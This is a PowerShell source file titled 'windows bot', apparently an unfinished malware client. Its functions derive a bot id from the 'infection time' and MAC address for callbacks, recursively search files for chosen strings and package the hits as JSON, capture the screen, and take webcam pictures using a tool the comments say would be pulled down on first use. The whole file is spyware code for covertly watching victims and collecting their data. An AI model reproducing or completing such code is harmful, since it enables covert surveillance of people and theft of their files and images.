# windows bot 


# Name:			create_hash
# Parameters:	$str_to_hash (the string we want to hash with sha256)
# Return value:	$hashed (the hashed string)
# Purpose:		create a hash of a string, used for bot uid
function create_hash($str_to_hash){
	$algorithm = new-object System.Security.Cryptography.SHA256Managed
    $toHash = [System.Text.Encoding]::UTF8.GetBytes($str_to_hash)
    $hashByteArray = $algorithm.ComputeHash($toHash)
    foreach($byte in $hashByteArray)
    {
         $hashed += $byte.ToString()
    }
    return $hashed;
}

# Name:			get_uid
# Parameters:	None
# Return value:	$bot_uid (the uid of our bot)
# Purpose:		gets the uid of our bot for callbacks and tracking
function get_uid() {
	# get infection time and then mac address to hash for bot uid
	$date = @(get-date)
	$adapter = @(get-netadapter | select MacAddress | select-object -first 1)
	$mac = $adapter[0].MacAddress # we just want the 1st mac yolosauce
	$to_hash = $date + $mac
	# hash the date+mac
	$bot_uid = create_hash $to_hash
	
	return $bot_uid
}

# Name: 		find_string
# Parameters: 	$string, list of strings we are searching for
# Return value:	returns an object containing the list of files
# Purpose: 		find all files containing a given string
function find_string ($stringarray){
	# get all the files that contain the strings we are searching for and append them to the list $files
	foreach ($str in $stringarray){
		$files += get-ChildItem -recurse | select-string -pattern $str | select-object -Property Filename, Linenumber, Line
	}

	# gets the uid of the bot for the returned data
	$uid = get_uid
	
	# create a blank json object for us to append our findings to
	($json = [pscustomobject]@{})
	
	# add the uid to the object 
	$json | add-member -membertype noteproperty -name uid -value $uid
	for($i=0; $i -le $files.length; $i++){
		$fname = "file" + $i
		$json | add-member -membertype noteproperty -name $fname -value $files[$i]
	}
	
	echo $json |convertto-json
}
$stringarray = "this is a super hard test", "another etest yo"
find_string $stringarray

# Name:			take_screenshot
# Parameters:	None
# Return value:	$file (path to screenshot on local system)
# Purpose:		takes a screenshot and saves it in the format screenshot_yyyy-mm-dd_H_M_s.
function take_screenshot {
	$file = "C:\Users\whatbatman\screenshot_$(get-date -format yyyy-mm-dd_H_M_s).bmp"

	# get the dimensions of the screen 
	$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
	$width = $screen.Width
	$height = $screen.Height
	$left = $screen.Left
	$top = $screen.Top
	
	# create the bitmap to store the screenshot
	$bitmap = New-Object System.Drawing.Bitmap $width, $height
	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
	$graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
	$bitmap.Save($file)
	
	return $file
}

# Name:			webcam_capture
# Parameters:	None
# Return:		$file (path to image on local system)
# Purpose:		takes a picture with the webcam. This requires an additional too we will pull down first use
function webcam_capture {
	# If we don't have the application required to screenshot, go get it. Then run it.
	# If we already have it then this test will pass and will just run it.
	#if (-not Test-Path 'C:\Program Files\CommandCam.exe'){
#		wget http://localhost/CommandCam.exe
	#}
	
	$date = Get-Date -format yyyy-mm-dd_H_M_s
	
	.C:\Program Files\CommandCam.exe /filename .pics$date.bmp
	
	return ".pics$date.bmp"
}


